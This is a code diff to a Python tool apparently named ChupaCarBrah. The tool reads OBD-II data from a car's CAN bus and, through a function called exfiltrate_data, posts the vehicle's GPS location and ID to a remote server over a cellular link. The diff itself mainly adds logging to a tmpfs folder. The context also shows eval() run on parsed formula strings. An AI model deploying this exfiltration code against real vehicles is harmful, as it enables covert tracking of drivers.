@@ -41,6 +41,12 @@ stop_file = "/tmp/stop"
 global exported_data_file
 exported_data_file = "chupacarbrah.txt"
 
+global memory_folder
+memory_folder = "/tmp/chupacarbrah"
+
+global memory_folder_size
+memory_folder_size = "2M"
+
 
 def hologram_network_connect():
     hologram_network_disconnect()
@@ -54,24 +60,44 @@ def hologram_network_connect():
     else:
         message = "Failed to start PPP"
 
-    print(message)
+    _output_message(message)
 
 
 def hologram_network_disconnect():
-    print('Checking for existing PPP sessions')
+    _output_message('Checking for existing PPP sessions')
     for proc in psutil.process_iter():
 
         try:
             pinfo = proc.as_dict(attrs=['pid', 'name'])
         except:
-            print("Failed to check for existing PPP sessions")
+            _output_message("Failed to check for existing PPP sessions")
 
         if 'pppd' in pinfo['name']:
-            print('Found existing PPP session on pid: %s' % pinfo['pid'])
-            print('Killing pid %s now' % pinfo['pid'])
+            _output_message('Found existing PPP session on pid: %s' % pinfo['pid'])
+            _output_message('Killing pid %s now' % pinfo['pid'])
             process = psutil.Process(pinfo['pid'])
             process.terminate()
             process.wait()
+
+
+def _output_message(message):
+    print(message)
+    try:
+        output_file = memory_folder + os.sep + "log"
+        statvfs = os.statvfs(memory_folder)
+        free_bytes = statvfs.f_frsize * statvfs.f_bfree
+
+        if os.path.isfile(output_file):
+            file_size = os.path.getsize(output_file)
+            if free_bytes < 1000000 or file_size > 1000000:
+                output_file_backup = output_file + ".OLD"
+                cmd = "mv {} {}".format(output_file, output_file_backup)
+                os.system(cmd)
+
+        with open(output_file, "a") as f:
+            f.write(message + "\n")
+    except:
+        pass
 
 
 def _get_car_uuid():
@@ -121,7 +147,7 @@ def _read_gps_data():
 def exfiltrate_data(data):
     global server_url
     global car_uuid
-    print("Sending GPS data...")
+    _output_message("Sending GPS data...")
     with open(exported_data_file, "a+") as f:
         f.write(json.dumps(data)+"\n\n")
     url = server_url + "/api/v1/cars"
@@ -134,16 +160,21 @@ def exfiltrate_data(data):
         resp = requests.post(url=url, params=params, headers=headers, timeout=5, data=json.dumps(data))
         code = resp.json()
         if len(code) > 0:
-            print("GPS data sent!")
+            _output_message("GPS data sent!")
     except:
-        print("GPS data not sent!")
+        _output_message("GPS data not sent!")
         return False
     return True
 
 
 def run():
+    cmd = "mkdir -p {}".format(memory_folder)
+    os.system(cmd)
+    cmd = "mount -t tmpfs -o size={},mode=0755 tmpfs {}".format(memory_folder_size, memory_folder)
+    os.system(cmd)
+
     message = "Running ChupaCarBrah..."
-    print(message)
+    _output_message(message)
 
     os.system("ip link set {can_interface} up type can bitrate {bitrate}".format(can_interface=can_interface, bitrate=bitrate))
     time.sleep(2)
@@ -200,7 +231,7 @@ def run():
                                 response = bus.recv(timeout=2)
                                 if not response:
                                     message = "No response from CAN bus. Service: {} PID: {} - {}".format(service_id.zfill(2), pid.zfill(2), description)
-                                    print(message)
+                                    _output_message(message)
                                     break
                                 if response:
                                     received_pid = list(response.data)[2]
@@ -213,7 +244,7 @@ def run():
                                             try:
                                                 result = eval(formula)
                                                 message = "{description}: {result}".format(description=description, result=result)
-                                                print(message)
+                                                _output_message(message)
                                                 if pid_int == int(received_pid):
                                                     if pid_int == int("0C", 16):
                                                         rpm = result
@@ -222,18 +253,18 @@ def run():
                                                     if pid_int == int("0F", 16):
                                                         intake_air_temperature = result
                                             except:
-                                                print("Unable to parse formula: {}.".format(formula))
+                                                _output_message("Unable to parse formula: {}.".format(formula))
                                     if service_id == "9":
                                         result = ""
                                         try:
                                             for c in list(response.data)[-3:]:
                                                 result += chr(c)
                                             message = "{description}: {result}".format(description=description, result=result)
-                                            print(message)
+                                            _output_message(message)
                                         except:
-                                            print("Unable to parse response: {}.".format(response.data))
+                                            _output_message("Unable to parse response: {}.".format(response.data))
                         except can.CanError:
-                            print("CAN error")
+                            _output_message("CAN error")
 
             end = time.time()
             hours, rem = divmod(end - start, 3600)
@@ -256,7 +287,7 @@ def run():
     except OSError:
         pass
     message = "ChupaCarBrah exited successfully."
-    print(message)
+    _output_message(message)
     sys.exit(0)
 
 
